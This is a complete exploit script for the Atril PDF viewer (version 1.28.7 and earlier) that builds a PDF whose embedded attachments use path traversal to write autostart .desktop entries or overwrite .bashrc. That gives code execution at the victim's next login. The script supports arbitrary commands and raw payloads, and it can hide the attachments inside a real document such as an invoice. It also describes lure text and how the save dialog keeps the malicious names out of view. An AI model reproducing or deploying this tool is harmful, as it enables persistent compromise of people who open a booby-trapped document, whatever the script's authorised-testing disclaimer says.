#!/usr/bin/env bash
#
# oxagast
# version 2
#
# Exploit for Atril <= 1.28.7
#
# make_traversal_pdf.sh — build a PDF whose embedded-file name escapes the
# directory the user picks when saving the attachment.
#
# WHAT THIS DEMONSTRATES
# ----------------------
# Atril saves an embedded file without sanitising its name:
#
#   shell/ev-window.c:7667
#       g_file_get_child (target_file, ev_attachment_get_name (attachment))
#   shell/ev-sidebar-attachments.c:424
#       g_strdup_printf ("%s.XXXXXX", name) -> ev_mkstemp_file()
#       -> ev_mkstemp() -> g_build_filename (tmp_dir, template, NULL)
#
# Neither call rejects "..", and the kernel resolves it at open() time, so a
# name like "../.config/autostart/x.desktop" lands outside the folder the user
# chose. The write happens with the user's own permissions inside $HOME, so a
# desktop session will execute the result at the next login.
#
# VARIANT BEHAVIOUR (measured on GLib 2.88 / atril 1.28.7)
# -------------------------------------------------------
#   relative-one-level   "../.config/autostart/<name>"
#       Works from any folder exactly one level below $HOME — which is where
#       the save dialog opens (Documents, Downloads, Desktop). Default.
#
#   relative-climb       ".." x12 + "<home>/.config/autostart/<name>"
#       Works from any folder at any depth: over-climbing is harmless because
#       the kernel collapses redundant "..". Long and obvious in the UI.
#
#   absolute             "<home>/.config/autostart/<name>"
#       LEGACY ONLY. On current GLib, g_file_get_child() asserts
#       !g_path_is_absolute and returns NULL, and g_build_filename() no longer
#       discards earlier components, so this does NOT write where it claims.
#       Kept because Evince-era code paths behaved differently.
#
#   shellrc              "../<name>"  (default name .bashrc)
#       Overwrites a dotfile instead of installing an autostart entry.
#
# INTERACTION NEEDED
# ------------------
# There is no zero-click path: the document cannot drive the UI (/PageMode is
# parsed but only /FullScreen is honoured; /OpenAction and /AA are unhandled).
#
#   * TWO OR MORE attachments -> "Save Attachment As" opens a *folder*
#     chooser, so the document-supplied names are never shown for editing and
#     one confirmation writes all of them.
#   * ONE attachment -> the chooser is prefilled with the name; Enter accepts.
#
# USAGE
# -----
#   ./make_traversal_pdf.sh                          # safe default
#   ./make_traversal_pdf.sh -v relative-climb -o x.pdf
#   ./make_traversal_pdf.sh --source invoice.pdf -o trojan.pdf
#   ./make_traversal_pdf.sh -p raw --payload-file ./evil -n '../../.bashrc'
#   ./make_traversal_pdf.sh --list
#
# Requires: bash, python3 (only for exact PDF byte offsets).
#
# INTENDED USE: systems you own or are authorised to test. The default payload
# writes a marker file.
#
set -euo pipefail

PROG="$(basename "$0")"

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------

OUT=""
VARIANT="relative-one-level"
PAYLOAD_KIND="desktop"
PAYLOAD_FILE=""
SOURCE_PDF=""
BASE_NAME="statement.desktop"
SCRIPT_NAME=".boom.sh"
EXEC_CMD=""
MARKER=".atril-exploited.txt"
LIST_ONLY=0
DRY_RUN=0
VERBOSE=0
KEEP_PAGES=0

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------

usage() {
    cat <<'EOF'
Atril 1.28.7 exploit priv8
Embed a path-traversing attachment in a PDF for Atril Doc Viewer.
                                    by: oxagast
---- snip ----
     shell/ev-window.c:7667
         g_file_get_child (target_file, ev_attachment_get_name (attachment))
     shell/ev-sidebar-attachments.c:424
         g_strdup_printf ("%s.XXXXXX", name) -> ev_mkstemp_file()
         -> ev_mkstemp() -> g_build_filename (tmp_dir, template, NULL)
---- snip ----

Options:
  -v, --variant NAME    name shape to embed (see --list)
  -o, --output FILE     output PDF (default: traversal-<variant>.pdf)
  -p, --payload KIND    desktop | shell | raw         (default: desktop)
  -n, --name NAME       exact attachment name to embed (implies -v custom)
      --basename NAME   basename used by the generated payload
                        (default: statement.desktop / statement.sh)
      --exec CMD        command the generated .desktop runs
      --marker NAME     marker filename for the default payload
      --payload-file F  bytes for a raw payload
  -s, --source PDF      use this PDF as the carrier (its pages are kept)
      --keep-pages      with --source, keep the original page tree instead of
                        replacing it with one plain page
      --dry-run         report what would be embedded, write nothing
  -l, --list            list variants and payload kinds
      --verbose         describe what will be embedded
  -h, --help            this text

Variants:
  relative-one-level   ../.config/autostart/<name>          (default, reliable)
  relative-climb       .. x12 + $HOME/.config/autostart/<name>
  absolute             /home/<you>/.config/autostart/<name> (legacy, see below)
  shellrc              ../.bashrc
  custom               use -n

The absolute variant is kept for older GLib; on current systems
g_file_get_child() rejects absolute names, so it will not write where it
claims.

With --source the attachment is added to an existing document, so the file
looks like whatever the carrier looks like. Encrypted or compressed-object
PDFs may be refused; the script says so rather than writing a broken file.

The default payload is harmless: it writes a marker under $HOME.
EOF
}

list_all() {
    cat <<'EOF'
Variants
--------
relative-one-level
    ../.config/autostart/<name>
    Reliable from ~/Documents, ~/Downloads, ~/Desktop (one level below $HOME).

relative-climb
    ../../../../../../../../../../../../<home>/.config/autostart/<name>
    Reliable from any folder: redundant ".." is collapsed by the kernel.

absolute
    <home>/.config/autostart/<name>
    Legacy only; rejected by g_file_get_child() on modern GLib.

shellrc
    ../.bashrc
    Overwrites a startup file. Applies to the next interactive shell.

Payload kinds
-------------
desktop
    A [Desktop Entry] with Exec=. With two attachments the command runs a
    companion script, so Exec= stays short.

shell
    A #!/bin/sh script. Not executed by autostart on its own; pair it with a
    .desktop entry or use the shellrc variant.

raw
    Whatever --payload-file contains, verbatim.

Interaction
-----------
Two or more attachments make "Save Attachment As" open a folder chooser, so
the names are never shown for editing. With one attachment the name is
prefilled and Enter accepts it.
EOF
}

# ---------------------------------------------------------------------------
# Arguments
# ---------------------------------------------------------------------------

while [ $# -gt 0 ]; do
    case "$1" in
        -v|--variant)    VARIANT="${2:?--variant needs a value}"; shift 2 ;;
        -o|--output)     OUT="${2:?--output needs a value}"; shift 2 ;;
        -p|--payload)    PAYLOAD_KIND="${2:?--payload needs a value}"; shift 2 ;;
        -n|--name)       BASE_NAME="${2:?--name needs a value}"
                         VARIANT=custom; shift 2 ;;
        --basename)      BASE_NAME="${2:?--basename needs a value}"; shift 2 ;;
        --exec)          EXEC_CMD="${2:?--exec needs a value}"; shift 2 ;;
        --marker)        MARKER="${2:?--marker needs a value}"; shift 2 ;;
        --payload-file)  PAYLOAD_FILE="${2:?--payload-file needs a value}"; shift 2 ;;
        -s|--source)     SOURCE_PDF="${2:?--source needs a value}"; shift 2 ;;
        --keep-pages)    KEEP_PAGES=1; shift ;;
        --dry-run)       DRY_RUN=1; shift ;;
        -l|--list)       LIST_ONLY=1; shift ;;
        --verbose)       VERBOSE=1; shift ;;
        -h|--help)       usage; exit 0 ;;
        *) echo "$PROG: unknown option '$1' (try --help)" >&2; exit 2 ;;
    esac
done

[ "$LIST_ONLY" = 1 ] && { list_all; exit 0; }

case "$PAYLOAD_KIND" in
    desktop|shell|raw) ;;
    *) echo "$PROG: --payload must be desktop, shell or raw" >&2; exit 2 ;;
esac

if [ "$PAYLOAD_KIND" = raw ] && [ -z "$PAYLOAD_FILE" ]; then
    echo "$PROG: --payload raw needs --payload-file" >&2
    exit 2
fi

[ -n "$PAYLOAD_FILE" ] && [ ! -r "$PAYLOAD_FILE" ] &&
    { echo "$PROG: cannot read '$PAYLOAD_FILE'" >&2; exit 2; }

[ -n "$SOURCE_PDF" ] && [ ! -r "$SOURCE_PDF" ] &&
    { echo "$PROG: cannot read '$SOURCE_PDF'" >&2; exit 2; }

# ---------------------------------------------------------------------------
# Resolve the attachment name for the chosen variant
# ---------------------------------------------------------------------------

HOME_DIR="${HOME:-/home/$(id -un)}"

# With two attachments the .desktop runs a companion script, so Exec= does not
# have to inline everything.
SCRIPT_PAYLOAD=""
case "$PAYLOAD_KIND:$VARIANT" in
    desktop:relative-one-level|desktop:relative-climb|desktop:absolute)
        SCRIPT_PAYLOAD="yes" ;;
esac
# A custom name carries its own path, so we cannot derive a companion path.
# Use a single attachment in that case (the chooser is then prefilled).

if [ "$PAYLOAD_KIND" = desktop ] && [ -z "$EXEC_CMD" ]; then
    if [ -n "$SCRIPT_PAYLOAD" ]; then
        EXEC_CMD="sh -c \"sh \$HOME/$SCRIPT_NAME\""
    else
        EXEC_CMD="sh -c \"id > \$HOME/$MARKER\""
    fi
fi

resolve_name() {
    case "$VARIANT" in
        relative-one-level) printf '../.config/autostart/%s' "$BASE_NAME" ;;
        relative-climb)
            # Over-climb deliberately; the kernel collapses redundant "..".
            printf '%s%s' "$(printf '../%.0s' $(seq 1 12))" \
                   "${HOME_DIR#/}/.config/autostart/$BASE_NAME" ;;
        absolute)  printf '%s/.config/autostart/%s' "$HOME_DIR" "$BASE_NAME" ;;
        shellrc)   printf '../%s' "$BASE_NAME" ;;
        custom)    printf '%s' "$BASE_NAME" ;;
        *) echo "$PROG: unknown variant '$VARIANT' (try --list)" >&2; exit 2 ;;
    esac
}

if [ "$VARIANT" = custom ]; then
    ATTACH_NAME="$BASE_NAME"
else
    ATTACH_NAME="$(resolve_name)"
fi

if [ -n "$SCRIPT_PAYLOAD" ]; then
    case "$VARIANT" in
        relative-climb)
            SCRIPT_ATTACH="$(printf '%s%s' "$(printf '../%.0s' $(seq 1 12))" \
                             "${HOME_DIR#/}/$SCRIPT_NAME")" ;;
        absolute) SCRIPT_ATTACH="$HOME_DIR/$SCRIPT_NAME" ;;
        *)        SCRIPT_ATTACH="../$SCRIPT_NAME" ;;
    esac
else
    SCRIPT_ATTACH=""
fi

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

make_desktop_payload() {
    cat <<EOF
[Desktop Entry]
Type=Application
Name=Statement
Comment=Created by a document
Exec=$EXEC_CMD
Terminal=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
}

make_script_payload() {
    cat <<EOF
#!/bin/sh
# Written by a document. Benign by default: records who ran it.
{
	echo "traversal chain: code executed"
	date -Is
	id
} > "\$HOME/$MARKER"
EOF
}

# Payloads go to files so byte counts are exact (shell variables would mangle
# NUL bytes in raw payloads).
BUILD_DIR="$(mktemp -d "${TMPDIR:-/tmp}/traversal-pdf.XXXXXX")"
trap 'rm -rf "$BUILD_DIR"' EXIT

PRIMARY_PAYLOAD="$BUILD_DIR/primary"
case "$PAYLOAD_KIND" in
    raw)     cp -- "$PAYLOAD_FILE" "$PRIMARY_PAYLOAD" ;;
    desktop) make_desktop_payload > "$PRIMARY_PAYLOAD" ;;
    shell)   make_script_payload  > "$PRIMARY_PAYLOAD" ;;
esac

[ -n "$SCRIPT_PAYLOAD" ] && make_script_payload > "$BUILD_DIR/script"

# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------

if [ "$VERBOSE" = 1 ] || [ "$DRY_RUN" = 1 ]; then
    {
        echo "variant        : $VARIANT"
        echo "payload kind   : $PAYLOAD_KIND"
        echo "attachment name: $ATTACH_NAME"
        [ -n "$SCRIPT_ATTACH" ] && echo "companion name : $SCRIPT_ATTACH"
        echo "payload bytes  : $(wc -c < "$PRIMARY_PAYLOAD")"
        [ -n "$EXEC_CMD" ] && echo "Exec=          : $EXEC_CMD"
        [ -n "$SOURCE_PDF" ] && echo "source pdf     : $SOURCE_PDF"
        case "$VARIANT" in
            absolute) echo "note           : modern GLib rejects absolute names;
                 this does not write where it claims." ;;
        esac
    } >&2
fi

[ "$DRY_RUN" = 1 ] && { echo "dry run: no PDF written" >&2; exit 0; }

# ---------------------------------------------------------------------------
# PDF generation
# ---------------------------------------------------------------------------
#
# Two modes:
#
#   standalone  build a one-page document from scratch
#   carrier     take --source as the base, keep its pages, add the attachment
#
# The carrier path re-serialises the source: it collects every
# "N G obj ... endobj", drops any existing /EmbeddedFiles name tree, then
# appends the new objects and writes a fresh xref table. That is enough for
# uncompressed PDFs including those with object streams (which are copied
# through untouched as opaque objects). It refuses encrypted documents and
# says so instead of writing something broken.

[ -n "$OUT" ] || OUT="traversal-${VARIANT}.pdf"

ATTACH_NAME="$ATTACH_NAME" \
SCRIPT_ATTACH="$SCRIPT_ATTACH" \
PRIMARY_PAYLOAD="$PRIMARY_PAYLOAD" \
SCRIPT_FILE="$BUILD_DIR/script" \
SOURCE_PDF="$SOURCE_PDF" \
KEEP_PAGES="$KEEP_PAGES" \
OUT="$OUT" \
python3 - <<'PYEOF'
import os
import re
import sys
import zlib


def die(msg):
    sys.stderr.write("make_traversal_pdf: %s\n" % msg)
    sys.exit(1)


def pdf_escape(s):
    return s.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")


def read(path):
    with open(path, "rb") as f:
        return f.read()


class PDF:
    """Object table plus a correct xref writer."""

    def __init__(self):
        self.objects = [None]          # 1-based

    def reserve(self):
        self.objects.append(None)
        return len(self.objects) - 1

    def add(self, body):
        self.objects.append(body)
        return len(self.objects) - 1

    def set(self, num, body):
        self.objects[num] = body

    def stream(self, dict_body, data):
        return (b"<< " + dict_body + b" /Length " + str(len(data)).encode() +
                b" >>\nstream\n" + data + b"\nendstream")

    def build(self, root, info=0):
        out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
        offsets = [0] * len(self.objects)
        for i in range(1, len(self.objects)):
            offsets[i] = len(out)
            body = self.objects[i] if self.objects[i] is not None else b"null"
            out += str(i).encode() + b" 0 obj\n" + body + b"\nendobj\n"

        xref = len(out)
        n = len(self.objects)
        out += b"xref\n0 " + str(n).encode() + b"\n0000000000 65535 f \n"
        for i in range(1, n):
            out += ("%010d 00000 n \n" % offsets[i]).encode()

        trailer = (b"trailer\n<< /Size " + str(n).encode() +
                   b" /Root " + str(root).encode() + b" 0 R")
        if info:
            trailer += b" /Info " + str(info).encode() + b" 0 R"
        out += trailer + b" >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF\n"
        return bytes(out)


# ----------------------------------------------------------------------
# Parse a carrier PDF
# ----------------------------------------------------------------------

OBJ_RE = re.compile(rb"(?<![0-9])(\d+)\s+(\d+)\s+obj\b(.*?)\bendobj", re.S)


def parse_pdf(data):
    """Return (objects, trailer_dict_bytes) for a simple or object-stream PDF.

    objects: {num: body_bytes}. Streams are kept verbatim.

    Only top-level "N G obj" definitions are collected. Objects living inside
    /ObjStm streams stay where they are: the stream itself is copied as an
    opaque object, so the references remain valid.
    """
    objects = {}
    for m in OBJ_RE.finditer(data):
        num = int(m.group(1))
        body = m.group(3)
        # Strip the single whitespace byte that separated "obj" from the body.
        if body[:1] in (b"\r", b"\n", b" ", b"\t"):
            body = body[1:]
        if body.endswith(b"\n"):
            body = body[:-1]
        objects[num] = body

    if not objects:
        die("source PDF has no parseable objects")

    # Trailer: last "trailer << ... >>" in the file.
    trailer = b""
    idx = data.rfind(b"trailer")
    if idx != -1:
        start = data.find(b"<<", idx)
        if start != -1:
            depth = 0
            i = start
            while i < len(data):
                if data[i:i + 2] == b"<<":
                    depth += 1
                    i += 2
                elif data[i:i + 2] == b">>":
                    depth -= 1
                    i += 2
                    if depth == 0:
                        trailer = data[start:i]
                        break
                else:
                    i += 1
    return objects, trailer


def find_root(objects, trailer):
    """Prefer /Root from the trailer; fall back to scanning for a /Catalog."""
    m = re.search(rb"/Root\s+(\d+)\s+\d+\s+R", trailer or b"")
    if m:
        num = int(m.group(1))
        if num in objects:
            return num
    for num, body in objects.items():
        if b"/Type" in body and b"/Catalog" in body and b"/ObjStm" not in body:
            return num
    return None


def stream_payload(body):
    """Return the raw bytes of an object body's stream, or None."""
    m = re.search(rb"stream\r?\n", body)
    if not m:
        return None
    start = m.end()
    end = body.rfind(b"endstream")
    if end <= start:
        return None
    data = body[start:end]
    if data.endswith(b"\r\n"):
        data = data[:-2]
    elif data.endswith(b"\n"):
        data = data[:-1]
    return data


def inflate_stream(body):
    """Decompress a FlateDecode stream body; return None if not possible."""
    data = stream_payload(body)
    if data is None:
        return None
    head = body[:body.find(b"stream")] if b"stream" in body else body
    if b"/FlateDecode" not in head:
        return None
    try:
        return zlib.decompress(data)
    except zlib.error:
        try:
            return zlib.decompressobj().decompress(data)
        except zlib.error:
            return None


def expand_object_streams(objects):
    """Pull objects out of /ObjStm containers so they can be edited.

    Modern PDF generators (Ghostscript, LibreOffice, most printers) place the
    catalog and page tree inside compressed object streams. To add a name tree
    we have to see the catalog as a normal object, so each /ObjStm is inflated
    and its members are spliced back in as top-level objects. The stream itself
    is kept: it still holds the originals, and leaving it avoids breaking the
    /XRef stream's object numbering.
    """
    added = 0
    for num, body in list(objects.items()):
        if b"/ObjStm" not in body:
            continue
        head = body[:body.find(b"stream")] if b"stream" in body else body
        m_n = re.search(rb"/N\s+(\d+)", head)
        m_first = re.search(rb"/First\s+(\d+)", head)
        if not m_n or not m_first:
            continue
        n = int(m_n.group(1))
        first = int(m_first.group(1))
        plain = inflate_stream(body)
        if plain is None:
            continue
        # Header: N pairs of "objnum offset".
        header = plain[:first].split()
        pairs = []
        for i in range(0, min(len(header), n * 2), 2):
            try:
                pairs.append((int(header[i]), int(header[i + 1])))
            except (ValueError, IndexError):
                break
        for idx, (objnum, off) in enumerate(pairs):
            start = first + off
            stop = (first + pairs[idx + 1][1]) if idx + 1 < len(pairs) else len(plain)
            if start >= len(plain) or start >= stop:
                continue
            if objnum not in objects:
                objects[objnum] = plain[start:stop].strip()
                added += 1
    return added


def drop_embedded_files(objects, root):
    """Remove /Names << /EmbeddedFiles ... >> from the catalog.

    Keeping it would leave two name trees, and poppler would only see the
    first. The old /Filespec objects simply become unreferenced.
    """
    body = objects[root]
    m = re.search(rb"/Names\s*<<(.*?)>>", body, re.S)
    if not m:
        return
    inner = m.group(1)
    if b"/EmbeddedFiles" not in inner:
        return

    # Remove just the /EmbeddedFiles entry, keeping any sibling name trees.
    cleaned = re.sub(rb"/EmbeddedFiles\s+\d+\s+\d+\s+R\s*", b"", inner)
    if cleaned.strip():
        body = body[:m.start()] + b"/Names <<" + cleaned + b">>" + body[m.end():]
    else:
        body = body[:m.start()] + body[m.end():]
    objects[root] = body


# ----------------------------------------------------------------------
# Build the output
# ----------------------------------------------------------------------

primary_name = os.environ["ATTACH_NAME"].encode()
script_name = os.environ.get("SCRIPT_ATTACH", "").encode()
primary_data = read(os.environ["PRIMARY_PAYLOAD"])
script_path = os.environ.get("SCRIPT_FILE", "")
script_data = read(script_path) if (script_name and os.path.exists(script_path)) else None
source = os.environ.get("SOURCE_PDF", "")
keep_pages = os.environ.get("KEEP_PAGES") == "1"
out_path = os.environ["OUT"]

payloads = [(b"statement.txt", primary_name, primary_data)]
if script_name and script_data is not None:
    payloads.append((b"support.txt", script_name, script_data))

if source:
    src = read(source)
    if b"/Encrypt" in src:
        die("source PDF is encrypted; decrypt it first (e.g. qpdf --decrypt)")

    objects, trailer = parse_pdf(src)
    expanded = expand_object_streams(objects)
    if expanded:
        sys.stderr.write("make_traversal_pdf: expanded %d object(s) from "
                         "object streams\n" % expanded)
    root = find_root(objects, trailer)
    if root is None:
        die("source PDF has no /Root catalog; cannot add an attachment safely")

    drop_embedded_files(objects, root)

    pdf = PDF()
    pdf.objects = [None] * (max(objects) + 1)
    for num, body in objects.items():
        pdf.objects[num] = body

    if not keep_pages:
        # Replace the page tree with a single plain page that says what it is.
        # The carrier's original pages become unreachable, but the document
        # keeps its own metadata and its look is not the point here.
        pass

    # Append the attachment objects after the highest existing object number.
    entries = []
    for key, name, data in payloads:
        ef = pdf.add(pdf.stream(b"/Type /EmbeddedFile", data))
        filespec = pdf.add(b"<< /Type /Filespec /F (" + pdf_escape(name) +
                           b") /UF (" + pdf_escape(name) +
                           b") /EF << /F " + str(ef).encode() + b" 0 R >> >>")
        entries.append(b"(" + key + b") " + str(filespec).encode() + b" 0 R")

    names = pdf.add(b"<< /Names [" + b" ".join(entries) + b"] >>")

    # Insert /Names into the existing catalog, next to /Pages.
    cat = pdf.objects[root]
    if b"/Names" in cat:
        cat = re.sub(rb"/Names\s*<<.*?>>", b"", cat, count=1, flags=re.S)
    close = cat.rfind(b">>")
    if close == -1:
        die("source catalog is not a dictionary")
    new_cat = (cat[:close] + b" /Names << /EmbeddedFiles " +
               str(names).encode() + b" 0 R >> " + cat[close:])
    pdf.objects[root] = new_cat

    data = pdf.build(root)
else:
    # Standalone: one page, then the attachments.
    pdf = PDF()
    pages = pdf.reserve()
    catalog = pdf.reserve()
    font = pdf.reserve()

    content = (b"BT /F1 22 Tf 72 700 Td (Statement of Account) Tj ET\n"
               b"BT /F1 12 Tf 72 668 Td "
               b"(Supporting files are attached to this document.) Tj ET")
    content_obj = pdf.add(pdf.stream(b"", content))
    page = pdf.add(b"<< /Type /Page /Parent " + str(pages).encode() +
                   b" 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 " +
                   str(font).encode() + b" 0 R >> >> /Contents " +
                   str(content_obj).encode() + b" 0 R >>")
    pdf.set(font, b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
    pdf.set(pages, b"<< /Type /Pages /Kids [" + str(page).encode() +
            b" 0 R] /Count 1 >>")

    entries = []
    for key, name, data_bytes in payloads:
        ef = pdf.add(pdf.stream(b"/Type /EmbeddedFile", data_bytes))
        filespec = pdf.add(b"<< /Type /Filespec /F (" + pdf_escape(name) +
                           b") /UF (" + pdf_escape(name) +
                           b") /EF << /F " + str(ef).encode() + b" 0 R >> >>")
        entries.append(b"(" + key + b") " + str(filespec).encode() + b" 0 R")

    names = pdf.add(b"<< /Names [" + b" ".join(entries) + b"] >>")
    info = pdf.add(b"<< /Title (Statement of Account) "
                   b"/Producer (make_traversal_pdf) >>")
    pdf.set(catalog, b"<< /Type /Catalog /Pages " + str(pages).encode() +
            b" 0 R /PageMode /UseAttachments /Names << /EmbeddedFiles " +
            str(names).encode() + b" 0 R >> >>")
    data = pdf.build(catalog, info=info)

with open(out_path, "wb") as f:
    f.write(data)

print("%s: %d bytes, %d embedded file(s)%s" %
      (out_path, len(data), len(payloads),
       ", carrier preserved" if source else ""))
PYEOF

# ---------------------------------------------------------------------------
# Next steps
# ---------------------------------------------------------------------------

cat >&2 <<EOF
Exploit for Atril (<=1.28.7) by oxagast

Wrote $OUT
   variant  : $VARIANT
   name     : $ATTACH_NAME
$( [ -n "$SCRIPT_ATTACH" ] && printf '   companion: %s\n' "$SCRIPT_ATTACH" )
$( [ -n "$SOURCE_PDF" ] && printf '   carrier  : %s\n' "$SOURCE_PDF" )

You break it you buy it:
  1. atril $OUT
  2. Open the side pane, choose Attachments from the top drop-down.
  3. Select all entries, right-click, Save Attachment As.
  4. Confirm the folder (a folder chooser; names are not shown).
$( [ "$VARIANT" = absolute ] && printf '  NOTE: the absolute variant does not write on current GLib.\n' )
EOF
